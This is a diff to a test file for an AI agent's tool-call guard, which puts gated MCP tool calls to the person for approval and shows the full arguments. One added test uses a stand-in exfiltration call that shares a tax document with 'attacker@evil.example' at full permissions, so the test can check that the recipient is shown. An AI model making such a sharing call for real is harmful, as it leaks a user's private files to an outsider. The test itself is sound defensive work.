@@ -29,7 +29,7 @@ const { SdkPiClient } = await import("../dist/pi/sdk-client.js");
 const db = await import("../dist/db.js");
 const { sessions } = await import("../dist/session-manager.js");
 db.setSettings({ ...db.getSettings(), provider: "fake", model: "m" });
-const { guardExtension, declaredGuard } = await import("../dist/pi/guard.js");
+const { guardExtension, declaredGuard, callSubject, approvalArguments } = await import("../dist/pi/guard.js");
 
 let n = 0;
 const chat = () => mkdtempSync(path.join(process.env.WORKSPACE_ROOT, "chat-"));
@@ -83,7 +83,7 @@ test("a call of a tool its server's approve names is put to the person: yes lets
   const yes = await run([{ name: "mcp__alpha__ping", args: {} }, { name: "mcp__alpha__echo", args: { text: "hi" } }, { name: "mcp__alpha__delete_repo", args: { name: "x" } }], { answer: true });
   assert.deepEqual(yes.asked.map((e) => e.title), ["Let mcp__alpha__echo run?", "Let mcp__alpha__delete_repo run?"], "ping is no gated tool and is not asked about");
   assert.match(yes.asked[0].message, /The MCP server "alpha" is set up so that this tool asks you before each call\./);
-  assert.match(yes.asked[0].message, /The call, as the agent wrote it:\n.*hi/s, "the call is told as the agent wrote it");
+  assert.match(yes.asked[0].message, /The call, with all its arguments as the agent wrote them:\n.*"text": "hi"/s, "the call is told as the agent wrote it");
   assert.deepEqual(yes.reached, ["ping", "echo", "delete_repo"]);
   assert.ok(yes.results.every((r) => !r.isError), yes.results.map(textOf).join("\n"));
   assert.deepEqual(audit(yes.sessionId).filter((row) => row.kind === "allowed-by-approval").map((row) => row.tool).sort(), ["mcp__alpha__delete_repo", "mcp__alpha__echo"]);
@@ -170,11 +170,11 @@ test("the patterns are read at each call: a change holds in the chat that is run
 // --- the guard alone, for what real chats cannot show cheaply ---
 
 /** A guard as a chat has it, with a tool of a server and what the conversation has read. */
-function guardWith({ dialogs = true, role = "primary" } = {}) {
+function guardWith({ dialogs = true, role = "primary", key } = {}) {
   const h = { session: `mcp-approve-unit-${n++}` };
   const namespaces = { mcp__alpha__echo: "mcp__alpha", mcp__alpha__persist: "mcp__alpha" };
   const guards = { mcp__alpha__persist: declaredGuard({ name: "mcp__alpha__persist", guard: { acts: ["persist"] } }) };
-  guardExtension("t", () => ({ role }), h.session, () => new Set(), () => [], undefined, [], () => new Set(), () => false, () => undefined, (name) => guards[name], dialogs, (name) => namespaces[name], () => new Set(), (name) => (name.startsWith("mcp__alpha__") ? [name.slice("mcp__alpha__".length)] : []))({ on: (k, f) => (h[k] = f) });
+  guardExtension("t", () => ({ role, key }), h.session, () => new Set(), () => [], undefined, [], () => new Set(), () => false, () => undefined, (name) => guards[name], dialogs, (name) => namespaces[name], () => new Set(), (name) => (name.startsWith("mcp__alpha__") ? [name.slice("mcp__alpha__".length)] : []))({ on: (k, f) => (h[k] = f) });
   return h;
 }
 const person = (...answers) => {
@@ -266,5 +266,40 @@ test("a subagent's chat is held to it as every chat is: asked where its parent's
     assert.match(textOf(nobody.results[0]), /there is nobody to ask/, id);
     assert.deepEqual(reached(), [], id);
   }
+  db.setMcpApprove("alpha", undefined);
+});
+
+test("the person is asked with every argument of the call, not only its path: a recipient is what they confirm; a long text is cut with a mark", async () => {
+  db.setMcpApprove("alpha", ["echo"]);
+  const input = { path: "/Documents/tax-2025.pdf", share_with: "attacker@evil.example", share_type: 4, permissions: 31 };
+  const asked = [];
+  const h = guardWith();
+  const result = await h.tool_call({ toolName: "mcp__alpha__echo", input }, { ui: { confirm: async (title, message) => (asked.push(message), true) } });
+  assert.equal(result, undefined);
+  assert.match(asked[0], /\/Documents\/tax-2025\.pdf/);
+  assert.match(asked[0], /attacker@evil\.example/, "the recipient is shown");
+  assert.match(asked[0], /"share_type": 4/);
+  assert.match(db.listAudit(50).find((row) => row.session_id === h.session && row.kind === "allowed-by-approval").reason, /attacker@evil\.example/, "the log keeps what was allowed");
+  // Longer than fits: cut, and says how much.
+  const long = approvalArguments({ content: "x".repeat(10000) });
+  assert.ok(long.length < 4300);
+  assert.match(long, /\d+ more characters not shown/);
+  assert.equal(approvalArguments({ a: 1 }), '{\n  "a": 1\n}');
+  db.setMcpApprove("alpha", undefined);
+});
+
+test("somebody who is not the primary user cannot be asked: the call is refused before a one-off approval is looked at, and the approval is still there", async () => {
+  db.setMcpApprove("alpha", ["echo"]);
+  const h = guardWith({ role: "member", key: "bob" });
+  db.createSession({ id: h.session, title: h.session, workspace: chat(), executor: "host", kind: "task" });
+  const input = { text: "x" };
+  db.addGrant("gr1", h.session, "mcp__alpha__echo", callSubject("mcp__alpha__echo", input));
+  const nobody = person(true);
+  const refused = await h.tool_call({ toolName: "mcp__alpha__echo", input }, nobody.ctx);
+  assert.equal(refused.block, true);
+  assert.match(refused.reason, /confirmed by the person before they run; there is nobody to ask/);
+  assert.doesNotMatch(refused.reason, /primary user/, "no way to an approval that could not let it run");
+  assert.equal(nobody.asked.length, 0);
+  assert.equal(db.useGrant(h.session, "mcp__alpha__echo", callSubject("mcp__alpha__echo", input)), true, "the approval was not spent on a refused call");
   db.setMcpApprove("alpha", undefined);
 });
